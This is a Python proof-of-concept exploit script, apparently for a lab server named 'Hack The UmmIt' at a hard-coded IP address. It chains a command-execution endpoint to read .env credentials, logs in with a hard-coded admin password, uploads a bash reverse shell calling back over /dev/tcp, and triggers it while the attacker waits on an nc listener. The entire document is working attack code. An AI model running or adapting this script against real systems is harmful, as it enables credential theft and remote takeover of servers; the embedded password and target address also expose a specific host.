#!/usr/bin/env python3

"""
PoC Exploit for Hack The UmmIt Lab Server
Steps:
1. Read credentials from .env via /exec
2. Login to /admin
3. Upload reverse shell (with random filename)
4. Execute via /exec
"""

import requests
import random
import string
from urllib.parse import quote

requests.packages.urllib3.disable_warnings()

TARGET = "http://152.42.255.103:8080"
LHOST = "Your IP"
LPORT = 4444

def exploit():
    print("Hack The UmmIt - PoC Exploit")
    
    session = requests.Session()
    
    print("\n[*] Step 1: Reading credentials from .env...")
    url = f"{TARGET}/exec?cmd={quote('cat .env')}"
    response = session.get(url)
    print(f"[+] .env content:\n{response.text}\n")
    
    print("[*] Step 2: Login to /admin...")
    login_data = {'username': 'admin', 'password': '398104521h'}
    response = session.post(f"{TARGET}/admin", data=login_data)
    print(f"[+] Login status: {response.status_code}")
    
    print("\n[*] Step 3: Uploading reverse shell...")
    
    random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    filename = f"{random_name}.sh"
    
    shell_payload = f"sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    print(f"[+] Random filename: {filename}")
    print(f"[+] Payload: {shell_payload}")
    
    files = {'file': (filename, shell_payload, 'application/x-shellscript')}
    response = session.post(f"{TARGET}/admin", files=files)
    print(f"[+] Upload status: {response.status_code}")
    
    print("\n[*] Step 4: Triggering reverse shell...")
    print(f"[!] Make sure nc -lvnp {LPORT} is running!\n")
    
    cmd = f"cd uploads; bash {filename}"
    trigger_url = f"{TARGET}/exec?cmd={quote(cmd)}"
    print(f"[+] Triggering: {trigger_url}")
    
    try:
        session.get(trigger_url, timeout=3)
    except:
        print("[+] Shell triggered! Check your nc listener.")
    
    print("\n[+] Done!")


if __name__ == "__main__":
    exploit()